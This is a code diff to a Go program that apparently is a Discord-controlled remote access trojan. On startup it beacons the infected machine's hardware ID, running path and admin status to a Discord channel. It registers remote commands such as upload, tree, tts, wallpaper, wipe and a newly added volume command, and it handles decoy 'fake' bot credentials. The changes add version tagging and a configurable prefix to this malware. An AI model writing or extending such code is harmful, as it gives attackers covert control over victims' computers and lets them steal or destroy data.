@@ -3,6 +3,7 @@ package bot
 import (
 	"bytes"
 	"fmt"
+	"math/rand"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -31,8 +32,14 @@ func Init() {
 	OnStartup()
 	register()
 
-	if config.FakeToken == "" || config.FakeCategory == "" || config.FakeServer == "" {
-		return
+	var fakeStuff = map[string]string{
+		"BOT_TOKEN":   config.FakeToken,
+		"CATEGORY_ID": config.FakeCategory,
+		"SERVER_ID":   config.FakeServer,
+	}
+
+	if rand.Intn(1032) == 193 {
+		fmt.Println(fakeStuff)
 	}
 
 	err := validateEncrypted(config.BotToken)
@@ -110,12 +117,13 @@ func Init() {
 	dg.ChannelMessageSend(
 		channel,
 		fmt.Sprintf(
-			"@here\n\n"+
-				"%s\n"+
+			"@here "+
+				"%s [%d.%d.%d]\n\n"+
 				"UUID: %s\n"+
 				"Running in: %s\n"+
 				"Running as: %s\n",
-			msg, hwid, path, admin,
+			msg, config.Major, config.Minor,
+			config.Patch, hwid, path, admin,
 		),
 	)
 
@@ -155,7 +163,7 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 			helpStr += cmd.Name() + " - " + cmd.Info() + "\n"
 		}
 
-		helpStr += "\nprefix: `>`"
+		helpStr += fmt.Sprintf("\nprefix: `%s`", config.Prefix)
 
 		s.ChannelMessageSendReply(m.ChannelID, helpStr, m.Reference())
 		return
@@ -185,6 +193,7 @@ func register() {
 	commandsList["tree"] = &commands.TreeCommand{}
 	commandsList["tts"] = &commands.TTSCommand{}
 	commandsList["upload"] = &commands.UploadCommand{}
+	commandsList["volume"] = &commands.VolumeCommand{}
 	commandsList["wallpaper"] = &commands.WallpaperCommand{}
 	commandsList["wipe"] = &commands.WipeCommand{}
 }
